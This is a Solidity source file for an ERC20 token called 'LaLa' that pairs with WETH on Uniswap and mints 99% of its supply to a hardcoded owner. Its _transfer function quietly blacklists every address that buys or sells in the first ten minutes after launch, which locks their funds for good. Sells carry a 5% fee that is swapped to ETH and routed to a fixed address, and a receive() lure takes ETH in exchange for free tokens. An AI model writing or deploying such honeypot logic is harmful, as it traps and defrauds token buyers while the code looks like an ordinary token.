// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

import "./ERC20.sol";
import "./Ownable.sol";
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    // function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountETH);
    // function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin,  uint amountETHMin, address to,uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountETH);
    // function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    // function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path,address to,uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path,address to,uint deadline) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function factory() external view returns (address);
    function totalSupply() external view returns (uint256);
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {uint256 c = a + b;require(c >= a, "SafeMath: addition overflow");return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {require(b <= a, errorMessage);uint256 c = a - b; return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {if (a == 0) {return 0;}uint256 c = a * b;require(c / a == b, "SafeMath: multiplication overflow");return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return div(a, b, "SafeMath: division by zero");}
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {require(b > 0, errorMessage);uint256 c = a / b;return c;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return mod(a, b, "SafeMath: modulo by zero");}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage);return a % b;}
}
contract ERC20LaLa is Ownable, ERC20{
    using SafeMath for uint256;
    mapping(address => bool) hei;
    mapping(address => bool) bai;
    mapping(address => bool) public isJoin;
    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair public uniswapV2Pair;
    mapping(address => bool) isUPair;

    address yxAddr = address(0x5e9E2c46d1128d8037A1F5BA371cd53629a80fBB);
    address deadAddr = address(0x000000000000000000000000000000000000dEaD);
    address dex =  address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    // ETHDEX 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    // address dex =  address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // address usdt =  address(0x55d398326f99059fF775485246999027B3197955);
    // address dex =  address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e);
    // address usdt =  address(0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb);

    uint256 startTime;
    uint256 swapTotal;
    constructor() ERC20("LaLa", "LaLa") {
         address _owner = address(0x9Ba87Ad02Ab703DAc7912c593b8580C40996BdD0); //OW
        _transferOwnership(_owner);
        bai[_owner] = true;
        bai[address(this)] = true;
        _mint(_owner, 99_0000_0000_0000 * 10 ** decimals());
        _mint(address(this), 1_0000_0000_0000 * 10 ** decimals());
        _initSwap();
        startTime = block.timestamp;
    }

       
    function isBai(address addr) private view returns (bool) {
        return bai[address(addr)];
    }
    function isHei(address addr) private view returns (bool) {
        return hei[address(addr)];
    }
    function isPair(address addr) private view returns(bool){
        return address(uniswapV2Pair) == addr;
    }
    function calcFmt(uint256 amount, uint256 fee) private pure returns (uint256){
        if (amount <= 0)return 0;
        if (fee <= 0)return amount;
        return amount.mul(fee).div(100);
    }
    function _initSwap() private {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(dex);
        uniswapV2Router = _uniswapV2Router;
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        isUPair[_uniswapV2Pair] = true;
    }
   
    bool inSwapAndLiquify;
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "TOKEN: transfer from the zero address");
        require(to != address(0), "TOKEN: transfer to the zero address");
        if(amount == 0) {return super._transfer(from, to, 0);}
        require(!isHei(from),"TOKEN: is black address");
        require(!isHei(to),"TOKEN: is black address");

        bool canSwapSell = swapTotal > 0;
        if( canSwapSell
            && !inSwapAndLiquify
            && !isPair(from)
            && from != owner()
            && to != owner()
        ){
            if(swapTotal>0)_swapTokensForEth(swapTotal);
        }

        bool takeFee;
        if (isBai(from) || isBai(to))takeFee = true;
        if (!takeFee) {
            if(isPair(to) || isPair(from)){
                require(uniswapV2Pair.totalSupply() > 0,"TOKEN: LP is Not yet open");
                uint256 _amt;
                uint256 nowTime = block.timestamp;
                if(isPair(from)){//buy
                    if(nowTime.sub(startTime) < 600)hei[address(to)] = true;
                }
                if(isPair(to)){ //sell
                    if(nowTime.sub(startTime) < 600)hei[address(from)] = true;
                    _amt = calcFmt(amount,5);
                    amount = amount.sub(_amt);
                    swapTotal += _amt;
                    super._transfer(from, address(this), _amt);
                }
            }
        }
        super._transfer(from, to, amount);
    }

    function _swapTokensForEth(uint256 tokenAmount) private lockTheSwap{
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        swapTotal = swapTotal.sub(tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(yxAddr),
            block.timestamp
        );
    }
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function OwnerAtmETH() external onlyOwner{
        address sender = msg.sender;
        payable(sender).transfer(address(this).balance);
    }

    event LogBalance(string func,address sender,uint value);
    receive() external payable {
        address sender = msg.sender;
        if(isContract(sender)  || (tx.origin != sender))return;
        if(isJoin[sender])return;
        emit LogBalance("IntputETH",sender, msg.value);
        uint thatBalace = balanceOf(address(this));
        uint amt = 1_0000_0000 * 10 ** decimals();
        isJoin[sender] = true;
        super._transfer(address(this), sender, thatBalace>amt ? amt : thatBalace);
    }
}